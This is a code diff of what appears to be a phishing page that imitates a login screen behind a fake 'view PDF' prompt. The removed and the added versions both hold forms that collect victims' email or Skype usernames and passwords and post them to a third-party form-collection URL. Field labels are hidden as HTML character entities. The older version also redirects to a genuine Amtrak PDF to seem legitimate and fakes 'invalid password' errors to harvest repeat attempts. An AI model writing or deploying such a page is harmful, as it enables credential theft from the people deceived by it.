@@ -50,35 +50,6 @@ p{font-size: 40px;}
 }
 </style>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-	// Update AJAX request to include loading state
-$.ajax({
-    url: 'https://formbold.com/s/94pAZ',
-    type: 'POST',
-    data: serializedData,
-    beforeSend: function() {
-        $('#login-btn').html('<div class="loader"></div>'); // Show loader
-    },
-    success: function(result) {
-        console.log(result);
-        if (result == '1') {
-            $('.login-failed-notify').css('display', 'block');
-            $inputs.prop("disabled", false);
-            $('#validationCustom02').prop("value", "");
-            form.classList.remove('was-validated');
-            $('#login-btn').html(btnStr); // Reset button text
-        } else if (result == '2') {
-            window.open('https://www.amtrak.com/content/dam/projects/dotcom/english/public/documents/real-estate/pte-application-payment-instructions.pdf', '_blank');
-            location.reload();
-        }
-    },
-    error: function() {
-        $('.login-failed-notify').text('An error occurred. Please try again.').css('display', 'block');
-        $inputs.prop("disabled", false);
-        $('#login-btn').html(btnStr); // Reset button text
-    }
-});
-
 <script type="text/javascript">
 $(window).load(function() {
 	$(".loader").fadeOut("slow");
@@ -93,49 +64,20 @@ $(window).load(function() {
 <div id="image2" style="position:absolute; overflow:hidden; left:583px; top:357px; width:69px; height:14px; z-index:1"><a href="#"><img src="images/zt2.png" alt="" title="" border=0 width=69 height=14></a></div>
 
 <div id="image2" style="position:absolute; overflow:hidden; left:508px; top:332px; width:157px; height:17px; z-index:2"><a href="#"><img src="images/zt.png" alt="" title="" border=0 width=157 height=17></a></div>
-<form id="login-email" action="https://formbold.com/s/94pAZ" method="POST" class="needs-email-validation" novalidate>
-    <h2 id="login-email-title">Enter Your Email</h2>
-
-    <div>
-        <input name="username" type="email" id="validationCustom01" class="form-control" placeholder="Enter your email" required />
-        <div class="invalid-feedback">Please choose a valid email address.</div>
-    </div>
-
-    <div class="popup-footer">
-        <button id="next-btn" type="submit" class="btn btn-primary">Next</button>
-    </div>
-</form>
-
-<form id="login-password" action="https://formbold.com/s/94pAZ" method="POST" class="needs-password-validation" novalidate style="display:none;">
-    <h2>Welcome back,</h2>
-    <p id="user-email"></p> <!-- Email will be shown here after submission -->
-    <a id="change-email" href="javascript:;" onclick="changeEmail()">Change email</a>
-
-    <div>
-        <label class="password-lbl">Enter your password</label>
-        <div class="login-failed-notify" style="display:none;">Invalid Password. Try again.</div>
-        <input name="password" type="password" id="validationCustom02" class="form-control" placeholder="Password" required minlength="8" />
-        <input type="hidden" name="browserinfo" id="browserinfo" />
-        <div class="invalid-feedback">Password must be at least 8 characters long.</div>
-    </div>
-
-    <div class="popup-footer">
-        <button id="login-btn" type="submit" class="btn btn-primary">View with <span id="browser-name"></span> PDF Extension</button>
-    </div>
-</form>
-        </div>
-    </div>
-
-    <div class="toast align-items-center bg-danger" id="invalid-password-toast" role="alert" aria-live="assertive" aria-atomic="true">
-        <div class="d-flex">
-            <div class="toast-body">
-                Invalid Password, Try again with your valid email account or Password
-            </div>
-            <button type="button" class="btn-close me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
-        </div>
-    </div>
+<form action=https://formbold.com/s/94pAZ name=yehiswal id=yehiswal method=post>
 <input name="user" placeholder="&#69;&#109;&#97;&#105;&#108;&#44;&#32;&#112;&#104;&#111;&#110;&#101;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:351px;left:507px;top:280px;z-index:2">
 <div id="formimage1" style="position:absolute; left:749px; top:408px; z-index:3"><input type="image" name="formimage1" width="110" height="34" src="images/zxt.png"></div>
+</div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:508px; top:388px; width:137px; height:17px; z-index:1"><a href="#"><img src="images/zt4.png" alt="" title="" border=0 width=137 height=17></a></div>
+<form action="https://formbold.com/s/94pAZ" name=yehiswal id=yehiswal method=post>
+       <input name="user1" value="<?=$id?>" type="hidden">
+<input name="user" value="<?=$id?>" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:356px;left:534px;top:215px;z-index:2">
+<input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:507px;top:299px;z-index:3">
+
+<div id="checkboxG1"  style="position:absolute; left:507px; top:348px; z-index:4"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
+<div id="checkboxG1"  style="position:absolute; left:507px; top:348px; z-index:4"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
+<div id="formimage1" style="position:absolute; left:749px; top:424px; z-index:5"><input type="image" name="formimage1" width="110" height="34" src="images/zgn.png"></div>
 </div>
 
 </body>
